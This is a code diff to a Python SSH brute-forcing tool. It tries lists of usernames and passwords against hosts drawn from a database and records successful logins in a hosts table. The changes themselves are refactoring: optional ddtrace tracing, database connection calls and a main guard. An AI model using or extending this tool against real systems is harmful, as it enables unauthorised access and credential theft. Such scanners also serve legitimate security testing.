@@ -3,7 +3,6 @@
 # Missing module docstring
 # Missing class docstring
 # Catching too general exception Exception (broad-exception-caught)
-
 import socket
 import threading
 import time
@@ -14,7 +13,11 @@ from queue import Queue
 import random
 import paramiko
 
-from ddtrace import tracer
+try:
+    import ddtrace
+except ImportError:
+    pass
+
 from dotenv import load_dotenv
 from connection_param import Color, Connection
 
@@ -28,7 +31,14 @@ MAX_CONNECTIONS = 45
 
 load_dotenv()
 
-tracer.configure(hostname='172.28.0.5', port=8126)
+tracer = None
+
+try:
+    tracer = ddtrace.tracer
+    tracer.configure(hostname='172.28.0.5', port=8126)
+except NameError:
+    pass
+
 
 class SSHConnectionThread(threading.Thread):
     """Thread class for establishing SSH connections."""
@@ -83,9 +93,9 @@ def process_host(ip_address, usernames, passwords):
                 try:
                     client.connect(str(ip_address), port=22, username=username, password=password, timeout=15)
                     print(f"{colors.GREEN}Successful login on {colors.RESET}{ip_address}{colors.GREEN} with credentials: {colors.RESET}{username}/{password}")
-                    cur = conn.cursor()
+                    cur = conn.connect().cursor()
                     cur.execute("UPDATE hosts SET ssh_login = %s WHERE ip_address = %s", (f"{username}:{password}", str(ip_address)))
-                    conn.commit()
+                    conn.connect().commit()
                     break
                 except paramiko.AuthenticationException:
                     # Incorrect credentials, continue to the next one
@@ -130,9 +140,10 @@ def run(self):
             print(f"{colors.RED}Error occurred while processing {ip_address}: {str(caught_error)}")
         self.queue.task_done()
 
+
 def main(username_file, password_file):
     # Fetch the IP addresses from the database
-    cur = conn.cursor()
+    cur = conn.connect().cursor()
     cur.execute("SELECT ip_address FROM hosts WHERE ip_address IS NOT NULL")
     ip_addresses = [row[0] for row in cur.fetchall()]
     # Create a queue to hold the IP addresses
@@ -153,4 +164,7 @@ def main(username_file, password_file):
     for thread in threads:
         thread.join()
 
-main(USERNAME_FILE, PASSWORD_FILE)
+
+if __name__ == "__main__":
+    main(USERNAME_FILE, PASSWORD_FILE)
+
